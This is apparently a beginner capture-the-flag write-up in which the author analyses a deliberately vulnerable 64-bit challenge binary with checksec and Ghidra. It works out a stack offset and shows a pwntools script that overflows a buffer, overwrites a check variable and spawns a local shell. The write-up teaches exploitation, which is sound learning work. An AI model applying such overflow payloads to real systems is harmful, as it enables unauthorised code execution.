### Binary Exploitation

### Source: Imaginary CTF

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/stackoverflow]
└─$ file stackoverflow
stackoverflow: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c7bd1104c0adbdb1357db265116844c7a1304c4e, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/stackoverflow]
└─$ checksec stackoverflow
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/stackoverflow/stackoverflow'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Cool so we're working with a x64 binary. Which has all protection enabled except `Stack Canary` 

I'll run the binary to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/stackoverflow]
└─$ ./stackoverflow
Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
blue
Thanks! Now onto the posts!
ERROR: FEATURE NOT IMPLEMENTED YET
```

It asks for a colour name then exits after it gives the error `FEATURE NOT IMPLEMENTED YET`

Now i'll decompile using ghidra

Here's the decompiled main function

```

undefined8 main(void)

{
  undefined input [40];
  long check;
  
  check = 0x42424242;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts(
      "Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we wou ld like you to answer a question. What\'s your favorite color?"
      );
  __isoc99_scanf(&DAT_001009a3,input);
  puts("Thanks! Now onto the posts!");
  if (check == 0x69637466) {
    puts("DEBUG MODE ACTIVATED.");
    system("/bin/sh");
  }
  else {
    puts("ERROR: FEATURE NOT IMPLEMENTED YET");
  }
  return 0;
}
```

So its just a basic code here's what it does

```
1. Saves '4242424242' in a variable called check
2. Prints out the header stuff 
3. Uses scanf to receive our input
4. Does an if statement which compares the value stored in check to 0x69637466
5. If condition is met it grants a sh shell 
6. But if the condition isn't met it prints the error message and exist
```

So this is going to be a classic variable overwrite

I'll look at the stack layout to get the offset of our input to the check variable

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 check                                   XREF[2]:     001007c2(W), 
                                                                                                   00100836(R)  
             undefined1[40]    Stack[-0x38]   input                                   XREF[1]:     00100812(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:001006cd(*), 00100a28, 
                                                                                          00100ad0(*)  
```

Cool we see that our input is at offset 0x38 and the check variable is at offset 0x10

The offset between the two is `(0x38 - 0x10 = 0x28)`

With this the exploit script is ready to go

Now here's what the script will do:

```
1. Start the binary process 
2. Overwrite the check variable to 0x69637466 using an offset 0f 0x10 to reach it
3. Give an interactive shell
```

Here's the script below

```
from pwn import *

io = process('./stackoverflow')

payload = ""
payload += b"A"*40
payload += p64(0x69637466)

io.sendlineafter(b'?', payload)
io.interactive()
```

On running it

```
└─$ python2 exploit.py 
[+] Starting local process './stackoverflow': pid 75202
[*] Switching to interactive mode

Thanks! Now onto the posts!
DEBUG MODE ACTIVATED.
$ whoami
mark
$ ls -al
total 24
drwxr-xr-x  2 mark mark 4096 Feb  4 00:23 .
drwxr-xr-x 17 mark mark 4096 Feb  4 00:01 ..
-rw-r--r--  1 mark mark  161 Feb  4 00:23 exploit.py
-rwxr-xr-x  1 mark mark 8536 Feb  4 00:01 stackoverflow
$
```

And we're done 


<br> <br>
[Back To Home](../../index.md)

